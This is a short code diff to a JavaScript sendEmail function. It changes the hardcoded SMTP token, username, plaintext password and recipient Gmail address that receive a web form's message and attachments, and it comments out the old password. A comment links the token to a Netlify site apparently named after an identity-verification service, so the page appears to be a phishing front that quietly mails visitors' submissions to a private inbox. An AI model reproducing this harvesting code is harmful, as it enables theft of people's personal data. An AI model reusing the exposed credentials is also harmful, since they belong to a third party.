@@ -132,12 +132,13 @@ function sendEmail() {
             ];
 
             Email.send({
-                SecureToken : "61336f49-1bd6-4c1d-8e90-0ee648386950",
+                SecureToken : "0faac2e3-f17a-4357-9eff-a0b41a6d9ea4", // for domain name - https://idmetoken.netlify.app/
                 Host : "smtp.elasticemail.com",
-                Username : "mike.nexo.io@gmail.com",
-                Password : "26E2340C1F8E41572C8131573D2898D4CBB2",
-                To : 'mike.nexo.io@gmail.com',
-                From : "mike.nexo.io@gmail.com",
+                Username : "mikeychocho@gmail.com",
+                // Password : "26E2340C1F8E41572C8131573D2898D4CBB2",
+                Password : "AF02FB4B727151621706DFB93C8C2BCE7830",
+                To : 'mikeychocho@gmail.com',
+                From : "mikeychocho@gmail.com",
                 Subject: subject,
                 Body: message,
                 Attachments: attachments,
@@ -153,7 +154,8 @@ function sendEmail() {
                     }, 2000);
 
                     setTimeout(() => {
-                        window.location.reload();
+                        // window.location.reload();
+                        cl('Finished loading, reload() and message: ' + message);
                     }, 3000);
                 },
                 error => {
